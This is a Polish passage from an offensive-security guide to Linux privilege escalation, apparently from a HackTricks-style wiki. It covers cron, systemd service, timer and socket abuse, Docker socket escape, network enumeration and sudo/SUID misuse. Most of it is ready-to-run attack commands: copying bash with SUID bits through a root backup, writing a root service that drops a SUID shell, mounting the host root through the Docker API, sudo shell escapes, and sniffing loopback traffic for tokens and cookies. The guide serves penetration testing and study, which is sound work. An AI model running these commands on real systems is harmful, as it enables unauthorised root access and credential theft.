Zwykły użytkownik, który może zapisywać dokładnie to binarium, które uruchamia zadanie cron roota, może przekroczyć granicę uprawnień, ale niestandardowe sprawdzanie podpisu może odrzucić niepodpisany zamiennik. W udokumentowanym przypadku plik ELF należący do roota miał tryb `0760`, co pozwalało członkowi jego grupy na zapis, a właścicielowi root na wykonanie. Widoczny ślad procesów pokazał, że `objcopy` wyodrębniało `.text_sig` przed uruchomieniem binarium przez zadanie cron; pełny skrypt weryfikujący nie był dostępny do odczytu.<sup>[[2]](#references)</sup>

Działający zamiennik został podpisany przy użyciu leaked prywatnego materiału do podpisywania i podpisującego ELF. Jego [dokumentacja formatu](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) opisuje sekcję podpisu wyprowadzoną z `.text` pliku wykonywalnego. Samo dodanie certyfikatu lub pasującego ciągu do `.text_sig` nie zostało wykazane jako wystarczające do przejścia niewidocznej weryfikacji. Zanim uznasz, że zapisywalne podpisane binarium można wykorzystać, sprawdź faktycznie zaplanowaną ścieżkę, efektywne uprawnienia zapisu, uruchomienie przez roota oraz zasady weryfikatora. Sama sekcja `.text_sig` jest jedynie wskazówką do analizy.

### Często uruchamiane zadania cron

Możesz monitorować procesy, aby wyszukać te, które są uruchamiane co 1, 2 lub 5 minut. Być może uda ci się to wykorzystać do eskalacji uprawnień.

Na przykład, aby **monitorować co 0,1 s przez 1 minutę**, **posortować według najmniej często wykonywanych poleceń** i usunąć polecenia, które wykonano najczęściej, możesz użyć:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Możesz też użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (będzie monitorować i wyświetlać każdy uruchamiany proces).

### Kopie zapasowe roota zachowujące ustawione przez atakującego bity uprawnień (pg_basebackup)

Jeśli zadanie cron uruchamiane jako root wywołuje `pg_basebackup` (lub dowolne rekurencyjne kopiowanie) dla katalogu bazy danych, do którego możesz zapisywać, możesz umieścić w nim **plik binarny SUID/SGID**, który zostanie skopiowany ponownie jako **root:root**, z zachowaniem tych samych bitów uprawnień w lokalizacji kopii zapasowej.<sup>[[26]](#references)</sup>

Typowy przebieg wykrywania (jako użytkownik DB o niskich uprawnieniach):
- Użyj `pspy`, aby wykryć zadanie cron roota wywołujące co minutę coś w rodzaju `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Potwierdź, że możesz zapisywać w źródłowym klastrze (np. `/var/lib/postgresql/14/main`), a katalog docelowy (`/opt/backups/current`) po wykonaniu zadania jest własnością roota.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Działa to dlatego, że `pg_basebackup` zachowuje bity trybu plików podczas kopiowania klastra; gdy jest uruchamiany przez root, pliki docelowe dziedziczą **własność root + wybrane przez atakującego bity SUID/SGID**. Podatny jest każdy podobny uprzywilejowany mechanizm tworzenia kopii zapasowych lub kopiowania, który zachowuje uprawnienia i zapisuje pliki w lokalizacji, z której można je uruchomić.

### Niewidoczne zadania cron

Można utworzyć zadanie cron, **umieszczając znak powrotu karetki po komentarzu** (bez znaku nowej linii); zadanie cron będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Aby wykryć tego rodzaju ukryty wpis, sprawdź pliki cron za pomocą narzędzi ujawniających znaki sterujące:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Usługi

### Pliki _.service_ z prawem zapisu

Sprawdź, czy możesz zapisywać dowolny plik `.service`. Jeśli tak, **możesz go zmodyfikować**, aby **uruchamiał** twoje **backdoor**, gdy usługa zostanie **uruchomiona**, **ponownie uruchomiona** lub **zatrzymana** (może być konieczne poczekać na ponowne uruchomienie maszyny).\
Na przykład utwórz backdoor w pliku .service, dodając **`ExecStart=/tmp/script.sh`**

### Pliki binarne usług z prawem zapisu

Pamiętaj, że jeśli masz **uprawnienia do zapisu do plików binarnych uruchamianych przez usługi**, możesz zamienić je na backdoor, który zostanie uruchomiony przy ponownym uruchomieniu usług.

### PATH systemd - ścieżki względne

Możesz sprawdzić ścieżkę PATH używaną przez **systemd** za pomocą:

```bash
systemctl show-environment
```

Jeśli możesz **zapisywać** w którymkolwiek z folderów ścieżki, możesz być w stanie **eskalować uprawnienia**. Musisz poszukać **ścieżek względnych używanych w plikach konfiguracyjnych usług**, takich jak:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Następnie utwórz **plik wykonywalny** o **takiej samej nazwie jak binarny plik ze ścieżki względnej** w zapisywalnym przez Ciebie katalogu systemd PATH. Gdy usługa otrzyma polecenie wykonania podatnej akcji (**Start**, **Stop**, **Reload**), uruchomiony zostanie Twój **backdoor** (nieuprzywilejowani użytkownicy zwykle nie mogą uruchamiać ani zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Więcej informacji o usługach znajdziesz w `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**` i które kontrolują pliki `**.service**` lub zdarzenia. **Timery** mogą być używane jako alternatywa dla crona, ponieważ mają wbudowaną obsługę zdarzeń kalendarzowych i monotonicznych oraz mogą działać asynchronicznie.

Możesz wyliczyć wszystkie timery za pomocą:

```bash
systemctl list-timers --all
```

### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że będzie uruchamiał istniejące jednostki systemd (takie jak `.service` lub `.target`).

```bash
Unit=backdoor.service
```

W dokumentacji można przeczytać, czym jest Unit:

> Jednostka aktywowana po upływie czasu określonego przez timer. Argumentem jest nazwa jednostki bez sufiksu „.timer”. Jeśli nie została podana, domyślnie aktywowana jest usługa o tej samej nazwie co jednostka timera, z pominięciem sufiksu. (Zob. powyżej). Zaleca się, aby nazwa aktywowanej jednostki i nazwa jednostki timera były identyczne, z wyjątkiem sufiksu.

Aby wykorzystać to uprawnienie, musisz:

- Znaleźć jednostkę systemd (np. `.service`), która **wykonuje zapisywalny plik binarny**
- Znaleźć jednostkę systemd, która **wykonuje ścieżkę względną**, i mieć **uprawnienia do zapisu do zmiennej PATH systemd** (aby podszyć się pod ten plik wykonywalny)

**Więcej informacji o timerach znajdziesz w `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień roota i musisz wykonać:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Zwróć uwagę, że **timer** jest **aktywowany** przez utworzenie dowiązania symbolicznego do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Gniazda

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** na tej samej lub różnych maszynach w modelach klient-serwer. Do komunikacji między komputerami wykorzystują standardowe pliki deskryptorów Uniksa i są konfigurowane za pomocą plików `.socket`.<sup>[[14]](#references)</sup>

Gniazda można konfigurować za pomocą plików `.socket`.

**Więcej informacji o gniazdach znajdziesz w `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje różnią się od siebie, ale podsumowując, służą do **wskazania, gdzie będzie nasłuchiwać** gniazdo (ścieżka do pliku gniazda AF_UNIX, adres IPv4/6 i/lub numer portu, na którym ma nasłuchiwać itd.).
- `Accept`: Przyjmuje argument logiczny. Jeśli jego wartość to **true**, dla każdego przychodzącego połączenia **uruchamiana jest instancja usługi**, której przekazywane jest wyłącznie gniazdo połączenia. Jeśli jego wartość to **false**, wszystkie gniazda nasłuchujące są **przekazywane do uruchamianej jednostki usługi**, a dla wszystkich połączeń uruchamiana jest tylko jedna jednostka usługi. Ta wartość jest ignorowana w przypadku gniazd datagramowych i FIFO, gdzie jedna jednostka usługi bezwarunkowo obsługuje cały przychodzący ruch. **Domyślnie jest to false**. Ze względu na wydajność zaleca się pisanie nowych daemonów wyłącznie w sposób odpowiedni dla `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jeden lub więcej wierszy poleceń, które są **wykonywane odpowiednio przed** lub **po utworzeniu** i powiązaniu gniazd/FIFO nasłuchujących. Pierwszym elementem wiersza polecenia musi być bezwzględna nazwa pliku, po której następują argumenty procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane odpowiednio przed** lub **po zamknięciu** i usunięciu gniazd/FIFO nasłuchujących.
- `Service`: Określa nazwę jednostki **usługi, którą należy aktywować** po **nadejściu ruchu**. To ustawienie jest dozwolone tylko dla gniazd z `Accept=no`. Domyślnie jest to usługa o tej samej nazwie co gniazdo (z podmienionym rozszerzeniem). W większości przypadków użycie tej opcji nie powinno być konieczne.

### Zapisywalne pliki .socket

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś takiego: `ExecStartPre=/home/kali/sys/backdoor`, a backdoor zostanie uruchomiony przed utworzeniem gniazda. Dlatego **prawdopodobnie trzeba będzie poczekać na ponowne uruchomienie maszyny.**\
_Pamiętaj, że system musi korzystać z konfiguracji tego pliku gniazda, w przeciwnym razie backdoor nie zostanie uruchomiony_

### Aktywacja gniazda + zapisywalna ścieżka jednostek (utworzenie brakującej usługi)

Inną poważną błędną konfiguracją jest:

- jednostka gniazda z `Accept=no` i `Service=<name>.service`
- brak wskazanej jednostki usługi
- możliwość zapisu przez atakującego do `/etc/systemd/system` (lub innej ścieżki wyszukiwania jednostek)

W takim przypadku atakujący może utworzyć `<name>.service`, a następnie wywołać ruch do gniazda, aby systemd załadował nową usługę i uruchomił ją jako root.

Szybki przebieg:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Gniazda z prawem zapisu

Jeśli **zidentyfikujesz dowolne gniazdo z prawem zapisu** (_mówimy teraz o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), **możesz komunikować się** z tym gniazdem i być może wykorzystać lukę.

### Enumeracja Unix Sockets

```bash
netstat -a -p --unix
```

### Połączenie surowe

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Przykład wykorzystania podatności:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Gniazda HTTP

Pamiętaj, że mogą istnieć **gniazda nasłuchujące na żądania HTTP** (_nie chodzi mi o pliki .socket, ale o pliki działające jako gniazda Unix_). Możesz to sprawdzić za pomocą:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Jeśli socket **odpowiada na żądanie HTTP**, możesz się z nim **komunikować** i być może **wykorzystać jakąś podatność**.

### Zapisywalny socket Docker

Socket Docker, często znajdujący się pod ścieżką `/var/run/docker.sock`, to krytyczny plik, który należy zabezpieczyć. Domyślnie jest zapisywalny przez użytkownika `root` i członków grupy `docker`. Dostęp do zapisu do tego socketu może prowadzić do eskalacji uprawnień. Oto opis, jak można to zrobić, oraz alternatywne metody na wypadek, gdyby Docker CLI nie było dostępne.

#### **Eskalacja uprawnień za pomocą Docker CLI**

Jeśli masz dostęp do zapisu do socketu Docker, możesz eskalować uprawnienia za pomocą następujących poleceń:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Te polecenia umożliwiają uruchomienie kontenera z dostępem na poziomie root do systemu plików hosta.

#### **Bezpośrednie użycie Docker API**

Jeśli Docker CLI jest niedostępny, nadal można nadużyć socketu Docker, używając surowego HTTP przez socket Unix. Najbardziej niezawodny sposób:

- utwórz długotrwały kontener pomocniczy z podmontowanym katalogiem root hosta
- uruchom go
- utwórz instancję `exec` wewnątrz tego kontenera pomocniczego
- uruchom instancję `exec` i odczytaj wyniki za pośrednictwem API

**Wyświetlanie obrazów Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Utwórz i uruchom kontener pomocniczy**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Utwórz instancję exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Uruchom instancję exec i odczytaj wynik**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Ten wzorzec jest zwykle bardziej niezawodny niż próby ręcznego sterowania `attach` za pomocą `socat` lub `nc -U`. Gdy możesz utworzyć pomocniczy kontener z `/:/host`, możesz użyć dodatkowych instancji `exec`, aby odczytywać pliki, takie jak `/host/root/...`, dodawać klucze SSH w `/host/root/.ssh` lub modyfikować pliki startowe hosta.

### Inne

Pamiętaj, że jeśli masz uprawnienia do zapisu w gnieździe dockera, ponieważ **należysz do grupy `docker`**, masz [**więcej sposobów na eskalację uprawnień**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Jeśli [**API dockera nasłuchuje na porcie**, możesz również je skompromitować](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na ucieczkę z kontenerów lub nadużywanie środowisk uruchomieniowych kontenerów w celu eskalacji uprawnień**:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Eskalacja uprawnień za pomocą Containerd (ctr)

Jeśli okaże się, że możesz używać polecenia **`ctr`**, przeczytaj następną stronę, ponieważ **możesz być w stanie go nadużyć w celu eskalacji uprawnień**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Eskalacja uprawnień za pomocą **RunC**

Jeśli okaże się, że możesz używać polecenia **`runc`**, przeczytaj następną stronę, ponieważ **możesz być w stanie go nadużyć w celu eskalacji uprawnień**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany **system komunikacji międzyprocesowej (IPC)**, który umożliwia aplikacjom sprawną komunikację i współdzielenie danych. Zaprojektowany z myślą o nowoczesnych systemach Linux, zapewnia solidną strukturę obsługującą różne formy komunikacji między aplikacjami.<sup>[[16]](#references)</sup>

System jest wszechstronny i obsługuje podstawowe IPC, usprawniające wymianę danych między procesami, podobnie jak **rozszerzone gniazda domeny UNIX**. Umożliwia także rozgłaszanie zdarzeń lub sygnałów, ułatwiając płynną integrację komponentów systemu. Na przykład sygnał od demona Bluetooth informujący o przychodzącym połączeniu może spowodować wyciszenie odtwarzacza muzyki, poprawiając komfort użytkowania. D-Bus obsługuje również system obiektów zdalnych, upraszczający żądania usług i wywoływanie metod między aplikacjami, a tym samym usprawniający procesy, które tradycyjnie były złożone.

D-Bus działa w oparciu o **model zezwalania/odmawiania**, zarządzając uprawnieniami do wiadomości (wywołań metod, emisji sygnałów itp.) na podstawie łącznego efektu pasujących reguł zasad. Zasady te określają interakcje z magistralą i mogą umożliwić eskalację uprawnień poprzez wykorzystanie tych uprawnień.

Poniżej przedstawiono przykład takiej zasady z pliku `/etc/dbus-1/system.d/wpa_supplicant.conf`, określającej uprawnienia użytkownika root do posiadania nazwy, wysyłania wiadomości do i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Zasady bez określonego użytkownika lub grupy mają zastosowanie globalne, a zasady kontekstu „default” dotyczą wszystkich przypadków nieobjętych innymi, bardziej szczegółowymi zasadami.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Dowiedz się tutaj, jak enumerować i exploitować komunikację D-Bus:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto przeprowadzić enumerację sieci i ustalić pozycję maszyny.

### Ogólna enumeracja

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Jeśli aktywny wpis `/etc/inetd.conf` uruchamia GNU Inetutils `telnetd` jako root, sprawdź skonfigurowaną wersję binarną i lokalny listener, nawet jeśli port jest zbindowany tylko do loopback. GNU Inetutils w wersjach od 1.9.3 do 2.7 zawierało [bypass uwierzytelniania Telnet](https://seclists.org/oss-sec/2026/q1/89), w którym dostarczona przez klienta wartość `USER` trafiała do `login -f` (CVE-2026-24061). Proces lub ciąg wersji to wskaźnik — przed uznaniem usługi za podatną potwierdź status poprawek od dostawcy i sprawdź rzeczywisty daemon. Więcej informacji zawiera [przewodnik po Telnet](../../../network-services-pentesting/pentesting-telnet.md).

### Szybka wstępna diagnostyka filtrowania ruchu wychodzącego

Jeśli host może uruchamiać polecenia, ale callbacki zawodzą, szybko rozdziel filtrowanie DNS, transportu, proxy i tras:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Otwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie udało Ci się wcześniej nawiązać interakcji.

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Klasyfikuj nasłuchujące usługi według adresu wiązania:

- `0.0.0.0` / `[::]`: dostępne na wszystkich lokalnych interfejsach.
- `127.0.0.1` / `::1`: dostępne tylko lokalnie (dobrzy kandydaci do tunnel/forward).
- Konkretne wewnętrzne adresy IP (np. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): zwykle dostępne tylko z segmentów wewnętrznych.

### Procedura analizy usług dostępnych tylko lokalnie

Po przejęciu hosta usługi powiązane z `127.0.0.1` często po raz pierwszy stają się dostępne z Twojego shella. Szybka procedura lokalna wygląda następująco:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS jako skaner sieciowy (tryb tylko-sieciowy)

Oprócz lokalnych kontroli PE linPEAS może działać jako ukierunkowany skaner sieciowy. Korzysta z dostępnych plików binarnych w `$PATH` (zwykle `fping`, `ping`, `nc`, `ncat`) i nie instaluje żadnych narzędzi.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Jeśli użyjesz `-d`, `-p` lub `-i` bez `-t`, linPEAS działa wyłącznie jako skaner sieci (pomijając pozostałe kontrole eskalacji uprawnień).

### Sniffing

Sprawdź, czy możesz sniffować ruch sieciowy. Jeśli tak, możesz być w stanie przechwycić dane uwierzytelniające.

```
timeout 1 tcpdump
```

Szybkie praktyczne sprawdzenia:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) jest szczególnie cenny podczas post-exploitation, ponieważ wiele usług dostępnych wyłącznie wewnętrznie ujawnia tam tokeny/cookies/dane uwierzytelniające:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Przechwyć teraz, sparsuj później:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Użytkownicy

### Ogólna enumeracja

Sprawdź, **kim** jesteś, jakie masz **uprawnienia**, jacy **użytkownicy** znajdują się w systemie, którzy mogą się **login** i którzy mają **uprawnienia root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Duże UID

Niektóre wersje Linuksa były podatne na błąd umożliwiający użytkownikom z **UID > INT_MAX** eskalację uprawnień. Więcej informacji: [tutaj](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [tutaj](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [tutaj](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Wykorzystaj tę podatność** za pomocą: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy **należysz do grupy**, która może zapewnić uprawnienia roota:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy schowek zawiera coś interesującego (jeśli to możliwe)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Polityka haseł

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Znane hasła

Jeśli **znasz jakiekolwiek hasło** z danego środowiska, **spróbuj zalogować się jako każdy użytkownik** przy użyciu tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużego szumu, a na komputerze znajdują się programy `su` i `timeout`, możesz spróbować przeprowadzić brute-force użytkowników za pomocą [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzić brute-force użytkowników.

## Nadużycia zapisywalnych katalogów PATH

### $PATH

Jeśli okaże się, że możesz **zapisywać w którymś katalogu z $PATH**, możesz eskalować uprawnienia, **tworząc backdoor w zapisywalnym katalogu** pod nazwą polecenia, które ma zostać wykonane przez innego użytkownika (najlepiej roota) i które **nie jest ładowane z katalogu znajdującego się wcześniej w $PATH niż Twój zapisywalny katalog**.

### SUDO i SUID

Możesz mieć możliwość wykonania niektórych poleceń za pomocą sudo lub mogą one mieć ustawiony bit SUID. Sprawdź to za pomocą:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Niektóre **nieoczekiwane polecenia pozwalają odczytywać i/lub zapisywać pliki, a nawet wykonywać polecenie**.<sup>[[8]](#references)</sup> Na przykład:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Konfiguracja sudo może pozwalać użytkownikowi wykonywać niektóre polecenia z uprawnieniami innego użytkownika bez znajomości hasła.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

W tym przykładzie użytkownik demo może uruchomić vim jako root, więc uzyskanie shella jest teraz banalne: wystarczy dodać klucz ssh do katalogu root albo wywołać sh.

```
sudo vim -c '!sh'
```

### Nieujęte w cudzysłów porównanie Bash w skrypcie sudo

W Bash prawa strona wyrażenia `[[ "$protected" == $candidate ]]` jest wzorcem. Jeśli skrypt sudo z uprawnieniami roota pobiera wartość `candidate` z pliku kontrolowanego przez wywołującego, wartość taka jak `prefix*` może pasować do początku chronionego ciągu. Różne ścieżki sukcesu i błędu mogą wtedy ujawnić prefix oracle. Jeśli zamierzone jest dosłowne porównanie, ujmij prawą stronę w cudzysłów (`[[ "$protected" == "$candidate" ]]`). Zanim uznasz nieujęte w cudzysłów porównanie za podatne na wykorzystanie, sprawdź rzeczywiste argumenty sudo, pochodzenie danych wejściowych oraz obserwowalne zachowanie poszczególnych gałęzi. [Podręcznik GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) opisuje działanie wzorców.

### Pliki projektów PrusaSlicer uruchamianych przez sudo

Nieograniczone nadanie przez sudo uprawnień roota do `prusaslicer` lub `prusa-slicer` wymaga weryfikacji, jeśli wywołujący może wybrać projekt `.3mf` przeznaczony do cięcia. Projekt może zawierać skrypt post-processingowy uruchamiany podczas eksportu G-code; spreparowane projekty mogły wykonywać polecenia w PrusaSlicer do wersji 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Przed stwierdzeniem, że można przekroczyć granicę uprawnień, potwierdź obowiązującą regułę sudo, wersję pliku binarnego i poprawki dostawcy, źródło projektu oraz to, czy odpowiednia ścieżka eksportu jest uruchamiana. Stały argument projektu lub obowiązująca zasada `NOEXEC` mogą zmienić wynik. Samo wykrycie zainstalowanego slicera nie dowodzi istnienia ścieżki eskalacji uprawnień.

### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania polecenia:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Ten przykład, **oparty na maszynie HTB Admirer**, był **podatny** na **PYTHONPATH hijacking**, które umożliwiało załadowanie dowolnej biblioteki Pythona podczas wykonywania skryptu jako root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Zatruwanie zapisywalnego `__pycache__` / `.pyc` przy importach Pythona dozwolonych przez sudo

